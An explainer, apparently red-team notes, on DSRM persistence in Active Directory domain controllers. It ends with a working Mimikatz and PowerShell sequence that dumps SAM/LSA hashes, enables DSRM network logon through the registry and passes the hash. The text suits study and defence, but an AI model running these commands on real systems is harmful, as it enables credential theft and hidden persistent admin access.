
**DSRM Persistence** (Directory Services Restore Mode Persistence) refers to a method used by attackers to maintain persistent access to a **Domain Controller (DC)** in an Active Directory environment, even after a system reboot or a recovery operation. This method exploits the **Directory Services Restore Mode (DSRM)**, a special mode used for repairing or recovering Active Directory on a domain controller.

### **What is DSRM?**

**Directory Services Restore Mode (DSRM)** is a boot mode for **Windows Domain Controllers**. It is used for **maintenance** and **recovery** purposes, such as restoring Active Directory databases or performing repairs on a domain controller that is having issues. When a domain controller starts in DSRM:

- **Active Directory is not running**.
- The domain controller cannot authenticate users or provide directory services.
- Only local admin access is available (using the DSRM password).

The **DSRM password** is set during the promotion of a server to a Domain Controller, and it's required to log into the domain controller in **DSRM** mode.

### **DSRM Persistence in Attack Scenarios**:

Attackers can abuse DSRM to maintain access to a domain controller even if other attack vectors (such as compromised admin accounts or malicious Kerberos tickets) are detected or remediated. Here's how **DSRM Persistence** works:

1. **Exploiting DSRM**:
    
    - The attacker gains **administrator privileges** on the domain controller.
    - The attacker may modify the **DSRM password** to one that they control.
    - Once the DSRM password is changed, the attacker can log into the domain controller in DSRM mode, even if the domain controller is restarted.
2. **How It Maintains Persistence**:
    
    - If an attacker modifies the DSRM password, they can later use this password to log in as an administrator, bypassing other defenses or credential changes made during incident response.
    - The attacker may also use this method to access the **Active Directory database**, potentially extracting sensitive information like **NTLM hashes**, **Kerberos tickets**, and other credentials.
3. **Use Case in Red Teaming and Post-Exploitation**:
    
    - **Post-exploitation persistence**: After compromising a domain controller, attackers may change the DSRM password to maintain long-term access to the domain controller.
    - **Privilege Escalation**: In some cases, even if other privileged accounts are disabled or the attacker is blocked from logging in, the DSRM mode can provide a backdoor to regain control.
    - **Recovery Bypass**: Attackers can manipulate the DSRM password to bypass recovery or troubleshooting efforts by administrators.

### Command use 

for this attack need to DA privilege
or local admin privilege on dc

`PS > Invoke-mimikatz -Command '"token::elevate" "lsadump::sam"' -computername dcmachine
`PS > Invoke-mimikatz -Command '"lsadump::lsa /patch"' -Computername dcmachine

`PS > winrs /r:dc.domain.local powershell.exe
`PS > new-itemproperty "hklm:\System\CurrentControlSet\Control\LSA\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

then pass the hash 

`PS > Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::pth /user:administrator /domain:hostname /ntlm: /run:powershell.exe"'

`PS > Enter-Pssession -computername hostname -Authentication negotiate